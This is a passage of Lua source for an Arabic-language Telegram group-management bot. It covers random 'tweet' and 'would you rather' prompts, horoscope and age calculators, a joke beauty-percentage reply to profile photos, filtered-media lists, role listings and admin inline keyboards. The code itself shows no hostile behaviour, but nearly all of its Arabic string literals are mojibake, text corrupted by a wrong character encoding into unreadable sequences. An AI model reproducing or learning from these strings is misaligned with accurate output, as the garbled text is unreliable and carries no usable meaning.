"βΩΨͺ ΨͺΩΩΨͺ | Ψ¬Ψ³ΩΩ Ψ§ΩΨ¨Ψ± ΩΩ ΨΉΩΩΨ±Ω Ψ§Ω Ψ§ΩΨΉΩΨ³Ω Ψ!",
"βΩΨͺ ΨͺΩΩΨͺ |Ψ£ΩΩΩ ΩΨ°Ψ¨Ψ© ΩΨ΄Ψͺ ΨΉΩΩΩ Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΨͺΨͺΨ£Ψ«Ψ± Ψ¨Ψ―ΩΩΨΉ Ψ΄Ψ?Ψ΅ ΩΨ¨ΩΩ ΩΨ―Ψ§ΩΩ ΩΨ¨Ω ΨͺΨΉΨ±Ω Ψ§ΩΨ³Ψ¨Ψ¨ Ψ",
"ΩΨͺ ΨͺΩΩΨͺ | ΩΩ Ψ­Ψ―Ψ« ΩΨΆΨ­ΩΨͺ ΩΩ Ψ£Ψ¬Ω Ψ΄Ψ?Ψ΅Ω Ψ£Ψ­Ψ¨Ψ¨ΨͺΨ",
"βΩΨͺ ΨͺΩΩΨͺ | Ψ£ΩΨ«Ψ± ΨͺΨ·Ψ¨ΩΩ ΨͺΨ³ΨͺΨ?Ψ―ΩΩ ΩΨ€Ψ?Ψ±ΩΨ§Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | βΨ§ΩΨ«Ψ± Ψ΄Ω ΩΨ±ΨΆΩΩ Ψ§Ψ°Ψ§ Ψ²ΨΉΩΨͺ Ψ¨Ψ―ΩΩ ΨͺΩΩΩΨ± Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΨ΄ ΩΨ­ΨͺΨ§Ψ¬ ΨΉΨ΄Ψ§Ω ΨͺΩΩΩ ΩΨ¨Ψ³ΩΨ· Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΨ·ΩΨ¨Ω Ψ§ΩΩΨ­ΩΨ― Ψ§ΩΨ­ΩΩ Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΩ Ψ­Ψ―Ψ« ΩΨ΄ΨΉΨ±Ψͺ Ψ¨Ψ£ΩΩ Ψ§Ψ±ΨͺΩΨ¨Ψͺ Ψ£Ψ­Ψ― Ψ§ΩΨ°ΩΩΨ¨ Ψ£Ψ«ΩΨ§Ψ‘ Ψ§ΩΨ΅ΩΨ§ΩΨ",
"ΨΉΩΨ§ΩΨͺΩ ΩΨΉ Ψ§ΩΩΩ",
"Ψ«ΩΨ§Ψ«Ψ© Ψ£Ψ΄ΩΨ§Ψ‘ ΨͺΨ­Ψ¨ΩΨ§"
}
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']') 
return false
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬" and Addictive(msg) then
send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬')
database:set(bot_id.." amir:brj_Bots"..msg.chat_id_,"close")
end
if text == "Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬" then
send(msg.chat_id_, msg.id_,'Ψ§Ψ±Ψ³Ω Ψ¨Ψ±Ψ¬ + Ψ§Ψ³Ω Ψ¨Ψ±Ψ¬Ω\nΩΨ«Ψ§Ω Ψ¨Ψ±Ψ¬ Ψ§ΩΨ―ΩΩ\n')
database:set(bot_id.." amir:brj_Bots"..msg.chat_id_,"open")
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±" and Addictive(msg) then
send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±')
database:set(bot_id.." amir:age_Bots"..msg.chat_id_,"close")
end
if text == "Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±" then
send(msg.chat_id_, msg.id_,'Ψ§Ψ±Ψ³Ω Ψ§Ψ­Ψ³Ψ¨ + ΨͺΨ§Ψ±ΩΨ? ΩΩΩΨ§Ψ―Ω\nΩΨ«Ψ§Ω Ψ§Ψ­Ψ³Ψ¨ 2/2/2002 \n')
database:set(bot_id.." amir:age_Bots"..msg.chat_id_,"open")
end
if text == "ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ" or text == "Ψ¬ΩΨ§ΩΩ" then
if DevBot(msg) then
local function mahmoud(extra, mahmoud, success)
if mahmoud.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,mahmoud.photos_[0].sizes_[1].photo_.persistent_id_," ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ ΩΩ 500% \nΨΉΨ΄Ψ§Ω ΩΨ·ΩΨ± ΩΩΨ―Ψ§ ΩΨ§Ψ²Ω Ψ§Ψ·Ψ¨ΩΩ πΉβ₯\n" )
else
send(msg.chat_id_, msg.id_,'ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ±Ω ΩΩ Ψ­Ψ³Ψ§Ψ¨Ω', 1, 'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, mahmoud, nil)
else
local function mahmoud(extra, mahmoud, success)
local nspp = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",}
local rdbhoto = nspp[math.random(#nspp)]
if mahmoud.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,mahmoud.photos_[0].sizes_[1].photo_.persistent_id_," ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ ΩΩ "..rdbhoto.."πβ₯" )
else
send(msg.chat_id_, msg.id_,'ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ±Ω ΩΩ Ψ­Ψ³Ψ§Ψ¨Ω', 1, 'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, mahmoud, nil)
end
end
if text == "ΩΩ Ψ?ΩΨ±ΩΩ" or text == "Ψ?ΩΨ±ΩΩ" then
local khirok_Msg = {
"Ψ§ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨ¨ΩΨ§Ψ‘ ΩΨ―Ω Ψ§ΩΨ­ΩΨ§Ψ© ΩΨΉ Ψ£Ψ?ΩΩ Ψ£Ω Ψ§ΩΨ¨ΩΨ§Ψ‘ ΩΨ―Ω Ψ§ΩΨ­ΩΨ§Ψ© ΩΨΉ Ψ­Ψ¨ΩΨ¨Ω ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ ΨΉΨ±ΨΆΩΨ§ ΨΉΩΩΩ Ψ§ΩΨ³ΩΨ± ΩΩΨ―Ψ© 20 ΨΉΨ§Ω ΩΨΉ Ψ΄Ψ?Ψ΅ ΩΨ§Ψ­Ψ― ΩΩΨ· ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"Ψ§ΩΩ ΨͺΨ­Ψ¨ Ψ£ΩΨ«Ψ± ΩΨ§ΩΨ―Ω Ψ£Ω ΩΨ§ΩΨ―ΨͺΩΨ",
"Ψ§ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ₯ΨΉΨ·Ψ§Ψ‘ ΩΨ―ΩΨ© Ψ¨Ψ§ΩΨΈΨ© Ψ§ΩΨ«ΩΩ ΩΩΨ±Ψ― ΩΩ Ψ£ΩΨ±Ψ§Ψ― Ψ£Ψ³Ψ±ΨͺΩ ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨ°ΩΨ§Ψ‘ Ψ£Ω Ψ§ΩΨ«Ψ±Ψ§Ψ‘ ΩΨ§Ψ°Ψ§ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨ²ΩΨ§Ψ¬ ΩΩ Ψ΄Ψ?Ψ΅ ΨͺΨ­Ψ¨Ω Ψ£Ω Ψ΄Ψ?Ψ΅ Ψ³ΩΨ­ΩΩ ΩΩ Ψ¬ΩΩΨΉ Ψ£Ψ­ΩΨ§ΩΩ ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"Ψ§ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΩΩΩΨ« ΩΨ―Ω Ψ§ΩΨ­ΩΨ§Ψ© ΩΨΉ Ψ΅Ψ―ΩΩΩ Ψ§ΩΩΩΨΆΩ Ψ£Ω ΩΨΉ Ψ­Ψ¨ΩΨ¨Ω ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"Ψ§ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨ΄ΩΨ§Ψ―Ψ© Ψ§ΩΨ¬Ψ§ΩΨΉΩΨ© Ψ£Ω Ψ§ΩΨ³ΩΨ± Ψ­ΩΩ Ψ§ΩΨΉΨ§ΩΩΨ",
"Ψ§ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨΉΩΨ΄ ΩΩ ΩΩΩΩΩΨ±Ω Ψ£Ω ΩΩ ΩΩΨ―Ω Ψ£ΩΩΩΨ§ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨΉΩΨ―Ψ© Ψ₯ΩΩ Ψ§ΩΩΨ§ΨΆΩ Ψ£Ω Ψ§ΩΨ°ΩΨ§Ψ¨ Ψ₯ΩΩ Ψ§ΩΩΨ³ΨͺΩΨ¨Ω Ψ£ΩΩΩΨ§ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ ΨͺΩΨͺΨΉ Ψ΄Ψ±ΩΩ Ψ­ΩΨ§ΨͺΩ Ψ¨Ψ΅ΩΨ© ΩΩ Ψ§ΩΨ£Ψ«ΩΩΩ Ψ§ΩΨ·ΩΨ¨Ψ© Ψ£Ω Ψ­Ψ³Ω Ψ§ΩΨͺΨ΅Ψ±Ω Ψ£ΩΩΩΨ§ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ§ΩΨ²ΩΨ§Ψ¬ ΩΩ Ψ΄Ψ?Ψ΅ ΩΩ ΨΉΩΨ±Ω ΩΩΩΨ± Ψ£Ω Ψ΄Ψ?Ψ΅ ΩΩΨ¨Ψ±Ω Ψ¨ΨΉΨ΄Ψ±ΩΩ ΨΉΨ§Ω ΨΊΩΩ ΩΩ ΨͺΨ?ΨͺΨ§Ψ±",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ ΩΨͺΩΩ Ψ¨Ψ§ΩΨ³Ω Ψ£Ω ΩΨͺΩΩ Ψ¨Ψ§ΩΩΨ³Ψ―Ψ³ ΩΨ§Ψ°Ψ§ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
"ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨ΩΩ Ψ₯ΩΩΨ§Ψ° ΩΨ§ΩΨ―Ω Ψ£Ω Ψ₯ΩΩΨ§Ψ° ΩΨ§ΩΨ―ΨͺΩ ΩΩ ΨͺΨ?ΨͺΨ§Ψ±Ψ",
}
send(msg.chat_id_, msg.id_,'['..khirok_Msg[math.random(#khirok_Msg)]..']') 
return false
end
if text == 'ΨΉΩΨ―Ω' then 
local Text = "Ψ§ΩΩΨ§ Ψ¨Ω ΩΩ Ψ¬Ψ―ΩΨ―"
local keyboard = {
{'ΩΨ­ΩΩΨ―','Ψ³ΩΩΩΩ'},
{'ΩΩΨ§Ω Ψ§ΩΨ³ΩΨ±Ψ³'},
{'Ψ§ΨΊΨ§ΩΩ','Ψ§ΩΩΨ§Ω'},
{'Ψ§ΩΨΉΨ§Ψ¨ Ψ§ΩΨ³ΩΨ±Ψ³'}
}
send_inline_key(msg.chat_id_,Text,keyboard)
end
end
end
-------by-7oda--
if Chat_Type == 'UserBot' then
if text == '/start' or text == 'ΨΉΩΨ―Ω Ω­' then 
if Devss(msg) then
local Text = 'Ω­ ΩΨ±Ψ­Ψ¨Ψ§ Ψ¨Ω ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ¬Ψ§ΩΨ²Ω'
local keyboard = {
{'ΩΨ­ΩΩΨ―','Ψ³ΩΩΩΩ'},
{"ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ Ω­"},
{'Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ Ω­','ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨ³ΩΨ±ΩΨ± Ω­'},
{'Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³ Ω­'},
{'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω Ω­','ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω Ω­'},
{'ΨͺΩΨΈΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨Ψ§Ψͺ Ω­','ΨͺΩΨΈΩΩ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ω­'},
{'Ψ­Ψ°Ω Ψ³ΩΨ§Ω ΩΩΨ§ΩΨ§Ψͺ','Ψ§ΨΆΩ Ψ³ΩΨ§Ω ΩΩΨ§ΩΨ§Ψͺ'},
{'ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ Ω­','ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ Ω­'},
{'Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ Ω­','Ψ§ΩΩΨ·ΩΨ±ΩΩ Ω­','Ψ§Ψ°Ψ§ΨΉΩ Ω­'},
{'Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ Ω­','Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ Ψ?Ψ§Ψ΅ Ω­'},
{'ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ω­','ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ω­'},
{'ΨͺΩΨΉΩΩ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨͺΩΩΨ§Ψ¦ΩΩ β’','ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨͺΩΩΨ§Ψ¦ΩΩ β’'},
{'ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω Ω­','ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ Ω­'},
{'Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ Ω­','ΨΆΨΉ ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ Ω­'},
{'ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³ Ω­','ΨͺΨ­Ψ―ΩΨ« Ω­'},
{'ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω Ω­','ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΨͺΩ Ψ§ΩΨΉΨ§Ω Ω­'},
{'Ψ¬ΩΨ¨ ΩΨ³Ψ?Ω Ψ§Ψ­ΨͺΩΨ§Ψ·ΩΩ Ω­','Ψ¬ΩΨ¨ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ω­'},
{'Ψ§ΩΨΊΨ§Ψ‘'}
}

send_inline_key(msg.chat_id_,Text,keyboard)
end
end
if text and text:match("^/start ph(.*)$") then
Sf = text:match("^/start ph(.*)$")
local list = database:smembers(bot_id.."filterphoto"..Sf)  
for k,v in pairs(list) do
if v then
inline = {
{{text = '- Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΨΉ .',callback_data="pito"..v}},
}
send_inline_Media(msg.chat_id_,"sendPhoto","photo",v,inline) 
end
end
if #list == 0 then
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ΅ΩΨ± ΩΩΩΩΨΉΩ"  )  
return false
end
Zs = {
{{text = '- Ψ§ΨΆΨΊΨ· ΩΩΨ§ .',callback_data="delallph"..Sf}},
}
send_inlin_key(msg.chat_id_,"*Ω­ ΩΩ ΨͺΨ±ΩΨ― Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ ΩΩ Ψ§ΩΨ΅ΩΨ±Ψ*",Zs,msg.id_)
end
if text and text:match("^/start msg(.*)$") then
sl = text:match("^/start msg(.*)$")
local list = database:smembers(bot_id.."Mahmoud1:List:Filter"..sl)
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΩΨ§Ψͺ Ψ§ΩΩΩΩΩΨΉΩ \n"
for k,v in pairs(list) do
if v then
t = t..""..k.."- ["..v.."]\n"
end
end
if #list == 0 then
t = "*Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΨ§Ψͺ ΩΩΩΩΨΉΩ*"
end
send(msg.chat_id_, msg.id_,t)  
end  
if text and text:match("^/start gif(.*)$") then
Sf = text:match("^/start gif(.*)$")
local list = database:smembers(bot_id.."filteranimation"..Sf)
for k,v in pairs(list) do
if v then
inline = {
{{text = '- Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΨΉ .',callback_data="animation"..v.."chatid"..Sf}},
}
send_inline_Media(msg.chat_id_,"sendanimation","animation",v,inline) 
end
end
if #list == 0 then
t = "*Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨͺΨ­Ψ±ΩΨ§Ψͺ ΩΩΩΩΨΉΩ*"
send(msg.chat_id_, msg.id_,t)  
return false
end
ZsText = "*Ω­ ΩΩ ΨͺΨ±ΩΨ― Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ ΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§ΨͺΨ*"
Zs = {
{{text = '- Ψ§ΨΆΨΊΨ· ΩΩΨ§ .',callback_data="delallanimation"..Sf}},
}
send_inlin_key(msg.chat_id_,ZsText,Zs,msg.id_)
end  
if text and text:match("^/start Sti(.*)$") then
Sf = text:match("^/start Sti(.*)$")
local list = database:smembers(bot_id.."filtersteckr"..Sf)
for k,v in pairs(list) do
if v then
inline = {
{{text = '- Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΨΉ .',callback_data="Sticker"..v.."chatid"..Sf}},
}
send_inline_Media(msg.chat_id_,"sendSticker","Sticker",v,inline) 
end
end
if #list == 0 then
t = "*Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ§ΩΩΩΨ΅Ω ΩΩΩΩΨΉΩ*"
send(msg.chat_id_, msg.id_,t)  
return false
end
ZsText = "*Ω­ ΩΩ ΨͺΨ±ΩΨ― Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ ΩΩ Ψ§ΩΩΩΨ΅ΩΨ§ΨͺΨ*"
Zs = {
{{text = '- Ψ§ΨΆΨΊΨ· ΩΩΨ§ .',callback_data="delallSticker"..Sf}},
}
send_inlin_key(msg.chat_id_,ZsText,Zs,msg.id_)
end  
if text and text:match("^/start kkh(.*)$") then
kkh = text:match("^/start kkh(.*)$")
local list = database:smembers(bot_id.."Basic:Creator"..kkh)
q = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
q = q..""..k.."- ([@"..username.."])\n"
else
q = q..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
q = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ΄Ψ¦ΩΩ Ψ§Ψ³Ψ§Ψ³ΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ",callback_data="delasas"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,q,_key,msg.id_)
local list = database:smembers(bot_id.."Basic:Creator23"..kkh)
w = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ§ΩΩΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
w = w..""..k.."- ([@"..username.."])\n"
else
w = w..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
w = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ§ΩΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΨ§ΩΩΩΩ",callback_data="delowner"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,w,_key,msg.id_)

local list = database:smembers(bot_id.."Creator"..kkh)
e = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨ΄Ψ¦ΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
e = e..""..k.."- ([@"..username.."])\n"
else
e = e..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
e = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ΄Ψ¦ΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ",callback_data="delmonsh"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,e,_key,msg.id_)

local list = database:smembers(bot_id.."Manager"..kkh)
r = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
r = r..""..k.."- ([@"..username.."])\n"
else
r = r..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
r = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ―Ψ±Ψ§Ψ‘"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘",callback_data="delmanger"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,r,_key,msg.id_)

local list = database:smembers(bot_id.."Mod:User"..kkh)
y = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ§Ψ―ΩΩΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
y = y..""..k.."- ([@"..username.."])\n"
else
y = y..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
y = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΨ§Ψ―ΩΩΩΩ",callback_data="delmod"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,y,_key,msg.id_)

local list = database:smembers(bot_id.."Special:User"..kkh)
u = "\nΩ­ ΩΨ§Ψ¦ΩΨ© ΩΩΩΨ²ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
u = u..""..k.."- ([@"..username.."])\n"
else
u = u..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
u = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΨ²ΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΩΨ²ΩΩ",callback_data="delvip"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,u,_key,msg.id_)
end
if text and text:match("^/start qff(.*)$") then
qqff = text:match("^/start qff(.*)$")
local Texti = 'ΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩsource revorΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩ\nΨͺΨ³ΨͺΨ·ΩΨΉ ΨͺΨΉΨ·ΩΩ ΩΨͺΩΨΉΩΩ ΨΉΨ¨Ψ± Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/lock_links"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/unlock_links"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', callback_data=msg.sender_user_id_.."/lockwelcome"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', callback_data=msg.sender_user_id_.."/unlockwelcome"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockrepall"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockrepall"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω', callback_data=msg.sender_user_id_.."/lockide"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω', callback_data=msg.sender_user_id_.."/unlockide"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω', callback_data=msg.sender_user_id_.."/lockidephoto"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω', callback_data=msg.sender_user_id_.."/unlockidephoto"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±', callback_data=msg.sender_user_id_.."/lockkiked"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΨΈΨ±', callback_data=msg.sender_user_id_.."/unlockkiked"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ', callback_data=msg.sender_user_id_.."/locksetm"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±ΩΨΉ', callback_data=msg.sender_user_id_.."/unlocksetm"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ', callback_data=msg.sender_user_id_.."/lockkikedme"},{text = 'ΨͺΩΨΉΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ', callback_data=msg.sender_user_id_.."/unlockkikedme"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨', callback_data=msg.sender_user_id_.."/lockgames"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨', callback_data=msg.sender_user_id_.."/unlockgames"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―', callback_data=msg.sender_user_id_..msg.sender_user_id_.."/lockrepgr"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ―', callback_data=msg.sender_user_id_.."/unlockrepgr"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text and text:match("^/start tth(.*)$") then
tthh = text:match("^/start tth(.*)$")
local Texti = 'ΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩsource revorΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩΩ\nΨͺΨ³ΨͺΨ·ΩΨΉ ΩΩΩ ΩΩΨͺΨ­ ΨΉΨ¨Ψ± Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΩΩΩ Ψ§ΩΨ§ΨΆΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockjoine"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΨΆΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockjoine"},{text = 'ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockinlene"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockinlene"},
},
{
